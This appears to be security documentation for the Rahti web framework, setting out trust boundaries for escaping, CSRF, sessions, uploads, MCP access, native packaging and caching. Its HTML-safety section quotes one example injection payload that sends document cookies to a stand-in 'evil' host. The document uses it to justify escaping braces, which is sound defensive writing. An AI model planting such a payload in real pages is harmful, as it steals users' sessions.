# Security Boundaries

## Trust Model

Treat request data, route parameters, RPC payloads, upload metadata, database
content, and external service responses as untrusted. Rahti provides transport
and rendering safeguards; it does not decide application authorization or
business validation. Use `rahti::Validator` at the handler boundary and keep
secrets and backend diagnostics out of its user-facing messages.

The generated router also applies baseline browser response headers to every
route and public file. Their defaults, CSP compatibility requirements, HSTS
behavior, and application overrides are defined in `security-middleware.md`.
Dynamic requests additionally pass through the bounded per-client safety net
described in `rate-limiting.md`; deployment-wide and DDoS controls still
belong at the proxy or gateway.

## HTML and Script Safety

`@{...}` interpolation escapes values in HTML text and attributes, braces
included: `{` and `}` become `&#123;` and `&#125;`. Braces are not
HTML-special, but the PulsePoint runtime compiles every `{…}` in a reactive
block, so an unescaped stored value like `{fetch('//evil/' + document.cookie)}`
would execute. Attribute spreads (`@{..attrs}`) follow the same rule. `Html`
values bypass escaping because they are already trusted, and keep their braces
live.

- Prefer normal string/value interpolation.
- Use `Html::escape` when manually converting untrusted text to `Html`.
- Use `Html::from_raw` only for framework-authored or independently sanitized
  HTML. It is the explicit trust boundary.
- Never concatenate untrusted values into an `Html::from_raw` string: its
  braces are live PulsePoint expressions.

Inside `<script>`, use primitive `RenderJs` values or `Json(&value)`. Rahti
JSON-quotes strings and neutralizes `<` so user data cannot inject
`</script>` or an HTML comment opener. Do not build JavaScript source with
`format!` and inject it as trusted HTML.

PulsePoint text bindings escape rendered values. Runtime-managed raw HTML
mechanisms are an explicit trust boundary and should not receive unsanitized
content.

## CSRF and RPC

When an application has page or component RPCs, Rahti issues a random
port-scoped CSRF cookie on page requests. `pp.rpc` reads it and returns it in
the `X-CSRF-Token` header. The server requires a matching non-empty token.

- Call Rahti RPCs through `pp.rpc` so the wire headers and token are present.
- Do not disable or bypass the generated `csrf` layer.
- CSRF proves request origin/session continuity; it is not authentication or
  authorization. Mark a sensitive RPC `#[rpc(auth)]`, and check inside it that
  the signed-in user may touch the specific row with an application-defined
  ability — see `authentication.md` and `authorization.md`.
- Declared RPC parameters are the accepted payload surface. Do not add an
  untyped catch-all payload without deliberate validation.

Expected RPC failures return their public application messages to the browser.
Unexpected 5xx failures are redacted while development mode is off, but their
diagnostics still reach server telemetry. Public messages and structured
details remain application-owned: do not place secrets, credentials, internal
queries, or sensitive upstream responses in them. See `error-handling.md`.

## Sessions and Authorization

Full rules are in `authentication.md` and `authorization.md`. The
security-relevant ones:

- The session cookie is **signed, not encrypted**. Its payload is readable by
  whoever holds it. Never sign in a password hash, an API token, or anything
  you would not show the user.
- `AUTH_SECRET` is a credential and lives in the ignored `.env`. An unset
  secret means a per-process random key: development only.
- The session cookie is `HttpOnly`; the CSRF cookie deliberately is not. Do not
  make the session readable to scripts.
- The route guard decides who may *load a page*. `#[rpc(auth)]` decides who may
  *make a call*. An RPC is a POST anyone can send, so protecting the page is
  not protecting the endpoint — mark both.
- Take the caller's identity from the session, never from an RPC parameter. A
  submitted resource id is input to an authorization policy, not proof that
  the caller owns that resource.
- Sessions are stateless and cannot be revoked before they expire. Sign-out
  clears the cookie; it does not invalidate a copy taken elsewhere.
- Do not add roles, permission strings, or OAuth providers to `rahti::auth`.
  Define application abilities with `rahti::authorization`, and enforce them
  in the handler before a protected read or side effect.

## Redirects and Navigation

PulsePoint normalizes server-provided redirects and accepts only same-origin
targets for SPA handling. External navigation should be explicit and should
not be derived from an unchecked request parameter.

When constructing links or redirect destinations, validate that user-supplied
paths remain within the intended origin and route space.

## Uploads

Browser filenames and content types are untrusted metadata.

- Never use `RpcFile::name()` or `RpcUpload::name()` directly as a path.
- Use `safe_name()` and choose a server-controlled directory.
- Prevent overwrites with application-specific naming or collision handling.
- Enforce content rules independently of the claimed MIME type/extension.
- Configure request and per-file limits for the deployment.
- Stream large files where possible; avoid `bytes()` when size is unbounded.
- If using `RAHTI_SPILL_DIR`, ensure the directory has restricted permissions
  and adequate lifecycle/disk monitoring.

Rahti cleans its own temporary spilled files when their final owner drops.
Files explicitly saved by application code become application-owned and need
their own retention/deletion policy.

## Static Files

Everything under the configured public directory is intentionally web
accessible. Never place secrets, source maps containing sensitive source,
private uploads, environment files, or server-only configuration there.

The public-directory override must point to the intended asset root. Treat
`RAHTI_PUBLIC_DIR` as trusted deployment configuration.

## Model Context Protocol

MCP is absent unless the project enables it. The public `/llms.txt` contains
only information safe for any visitor; never put credentials, private source,
customer data, or internal diagnostics there.

The `/mcp/` Streamable HTTP endpoint is a deeper read-only inspection surface.
Protect it with a unique `RAHTI_MCP_AUTH_TOKEN`; it does not accept the browser
session as authorization. Release builds fail closed when the token is absent,
and invalid credentials receive a Bearer challenge. Set
`RAHTI_MCP_ALLOWED_HOSTS` to the deployment's public hostnames so the MCP
transport's DNS-rebinding guard accepts the intended origin and nothing else.
Use `RAHTI_MCP_ALLOWED_ORIGINS` when browser-based MCP clients are allowed.

The discovery document deliberately publishes a relative endpoint and no
credential. `/mcp` redirects relatively to `/mcp/` with `307`, preserving the
client's HTTPS origin and request method across reverse proxies.

## Development Mode

Development mode injects a reload client and exposes internal dev endpoints.
Release builds disable it unless `RAHTI_DEV` overrides the default.

Do not enable `RAHTI_DEV` in production. Bind the server and expose it through
an appropriately configured reverse proxy/TLS boundary for production use.

Development diagnostics can contain rendered values, error messages, URLs,
and stack traces. `.rahti/dev.log` is gitignored, but that is not encryption:
do not deliberately log credentials, session tokens, private file contents,
or other secrets. Delete the log before sharing a workspace archive.

## Database Credentials

- The connection string is a credential and never appears in
  `rahti.config.json`, which is committed. It is read from `DATABASE_URL`.
- `.env` holds it in development and is gitignored. Nothing is committed in
  its place: what the file may contain is documented at
  <https://rahti.tsnc.tech/docs/environment>, not scaffolded into a second
  file that would go stale.
- `src/db.rs` reads `.env` without overriding variables already set, so a
  deployment that exports `DATABASE_URL` cannot be redirected by a stale file
  on the same machine.
- SeaORM parameterises queries. Bind values in any raw SQL rather than
  formatting them into the string.
- A value read from the database is untrusted like any other runtime value:
  `html!` escapes it, and `Html::from_raw` remains the only way to opt out.
- Migrations are never applied automatically. `db::migrate()` is called
  deliberately, so starting a server cannot change a schema.

## Native Packages

Everything above still applies — a packaged application is the same
application. What changes is the consequence of getting it wrong, and three
boundaries exist only here. Full rules in `native-packaging.md`.

- **An XSS reaches further.** In a browser it is a stolen session; in a native
  shell it is a stolen session and whatever the page can reach through the
  native bridge. That is why the bridge is a five-entry allowlist, why nothing
  on it runs a program or reads a path the page names, and why adding to it
  means editing the Rust allowlist *and* the Tauri capability file.
- **Loopback is not private.** `127.0.0.1` is unreachable from the network and
  reachable by every process on the machine. The embedded server binds only the
  loopback, on a port the operating system assigns, and — with
  `security.loopbackToken`, which is on by default — refuses any request not
  carrying this launch's cookie. That is neither authentication nor a
  replacement for CSRF; Rahti's own layers still answer both of those.
- **There is no `.env`.** The session signing key is generated on the device at
  first launch and kept in application storage, per installation, DPAPI-encrypted
  on Windows. Never bundle a `.env`, never ship an `AUTH_SECRET`, and never put
  a signing password, a keystore or a certificate in `rahti.native.json` — it
  has no field for one, and `native/.gitignore` refuses the files.

A release package sets `RAHTI_DEV=0` rather than inheriting it, so the
diagnostics endpoint and the reload stream cannot be turned on in a shipped
application by an exported variable.

The Content-Security-Policy a package serves comes from its own response
headers, because that is the only policy a browser applies to a page on a
loopback origin. The default permits no external source and does permit
`'unsafe-eval'`: PulsePoint builds a render function with `new Function` when
it compiles a reactive block, and without the directive every binding on an
otherwise-correct page is dead. Narrowing `script-src` further is not a
tightening, it is turning the browser runtime off.

## Supply Chain

The optional Tailwind download can execute a fetched standalone binary.
Pin its version and populate the platform-specific SHA-256 entry. A configured
hash mismatch must remain fatal.

PulsePoint's minified runtime is executable application code served to every
visitor. Replace it only with a trusted build of the same asset, install that
build in both locations, verify the two are byte-identical, and review the
diff. Do not patch minified code directly.

## Cache Boundaries

`rahti::cache` is shared application state. Never cache authorization answers,
sessions, CSRF values, password material, or another value whose absence or
staleness changes what a caller is allowed to do. For user-specific derived
data, include the user, tenant, locale, permission set, and every relevant
input in the key.

`pub fn cache() -> PageCache` is only for public, deterministic pages.
Authenticated sessions and responses that set cookies bypass it, but the page
key intentionally contains only the host and complete URL. It does not model
an application's arbitrary cookies, locale headers, experiments, or other
request state. If any of those change the HTML, do not declare a page cache.
Invalidate affected paths or tags only after the authoritative write succeeds.

External cache adapters own a namespace. Their `clear()` implementation must
clear only that namespace, never an unrelated application's keys on a shared
server. Cache credentials stay in the environment, not
`rahti.config.json`. See `caching.md` for the store contract.
